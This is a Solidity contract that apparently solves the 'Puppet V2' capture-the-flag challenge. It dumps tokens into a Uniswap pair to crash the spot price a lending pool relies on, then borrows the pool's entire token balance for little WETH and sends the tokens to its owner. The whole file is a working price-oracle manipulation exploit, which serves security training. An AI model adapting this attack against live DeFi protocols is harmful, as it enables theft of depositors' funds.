// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solmate/src/auth/Owned.sol";

interface IUniswapRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IPuppetV2Pool {
    function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256);
    function borrow(uint256) external;
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract AttackerPuppetV2 is Owned {
    IERC20 private immutable token;
    IWETH private immutable weth;
    IPuppetV2Pool private immutable lendingPool;
    IUniswapRouter private immutable uniswapRouter;

    uint256 private constant POOL_INITIAL_TOKEN_BALANCE = 1000000 * 10 ** 18;

    constructor(address _tokenAddress, address _wethAddress, address _uniswapRouterAddress, address _lendingPoolAddress)
        payable
        Owned(msg.sender)
    {
        token = IERC20(_tokenAddress);
        weth = IWETH(_wethAddress);
        uniswapRouter = IUniswapRouter(_uniswapRouterAddress);
        lendingPool = IPuppetV2Pool(_lendingPoolAddress);
    }

    function attack() public onlyOwner {
        uint256 thisDVT = token.balanceOf(address(this));

        token.approve(address(uniswapRouter), thisDVT);

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        uniswapRouter.swapExactTokensForTokens(thisDVT, 1, path, address(this), block.timestamp);

        uint256 thisETH2 = address(this).balance;
        weth.deposit{value: thisETH2}();

        uint256 thisWETH3 = weth.balanceOf(address(this));

        weth.approve(address(lendingPool), thisWETH3);
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(owner, POOL_INITIAL_TOKEN_BALANCE);
    }

    function receiver() public {}
}
